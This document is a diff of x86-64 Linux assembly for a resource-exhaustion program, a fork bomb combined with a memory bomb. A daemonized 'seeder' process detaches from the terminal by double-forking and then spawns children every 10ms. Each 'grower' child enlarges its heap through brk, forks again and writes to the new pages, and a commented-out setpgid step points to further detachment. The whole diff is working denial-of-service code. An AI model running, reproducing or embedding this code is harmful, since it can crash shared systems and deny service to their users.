@@ -3,64 +3,73 @@ section .data
 
 s dq 0
 ns dq 10000000 ;10ms
-
+pgid dd 0
 
 section .text
 
 global _start
-_start:
 
+exit:
+    ;exit
+    mov rax, 60
+    xor rdi, rdi
+    syscall
+
+fork:
     ;fork
     mov rax, 57
     syscall 
-    test rax,rax
-    jz continue
+    ret
 
-    locked: ;idle spin lock main proces to prevent terminal detach
+daemon:
+    call fork
+    test rax,rax 
+    jnz exit
+    ret
+
+
+daemonfork:
+    call fork
+    test rax,rax
+    jz skipper
+        call daemon; daemonize the child again
+    skipper:
+
+sleep:
     ;nanosleep
     mov rax, 35
     mov rdi, s
     xor rsi, rsi
     syscall
+
+
+_start:
+    
+    call fork
+    test rax,rax
+    jz continue
+
+    locked: ;idle spin lock main proces to prevent terminal detach
+    call sleep
     jmp locked
 
     continue:
-	;SEEDER CODE
+	;SEEDER CODE 
 
-    ; DEAMONIZE child to become child of init
-    ;fork
-    mov rax, 57
-    xor rdi, rdi
-    syscall 
-    test rax,rax 
-    jnz exit
-    ; DEAMONIZE
+    call daemon
 
     start:
-    ; ;nanosleep
-    ; mov rax, 35
-    ; mov rdi, s
-    ; xor rsi, rsi
-    ; syscall
-    ; jmp start
 
-
-	;fork
-	mov rax, 57
-	syscall	
+    call fork
 	test rax,rax
 	jz go
 
-	;nanosleep
-	mov rax, 35
-	mov rdi, s
-	xor rsi, rsi
-	syscall
+    call sleep
 
 	jmp start
 	go:
 
-    ;GROWER CODE init
+    ;GROWER CODE init 
 
     ;brk
     mov rax, 12
@@ -71,18 +80,27 @@ _start:
     mov r12, 1024*1024 ;1M
 
     grow:
-    ;GROWER CODE
+    ;GROWER CODE 
 
     ;brk
     mov rax, 12
     lea rdi, [rbx+r12]
     syscall
 
-    ;fork
-    mov rax, 57
-    syscall
+    call fork;daemonfork
     test rax, rax
     jnz grow
+
+; call daemon
+
+; ;setpgid
+; mov rax, 109
+; mov rdi, pgid
+; mov rsi, pgid
+; syscall
+
+; call sleep
+
 
     ;dirty pages
     mov rcx, r12
@@ -100,8 +118,3 @@ _start:
 
     jmp grow
 
-    exit:
-    ;exit
-    mov rax, 60
-    xor rdi, rdi
-    syscall
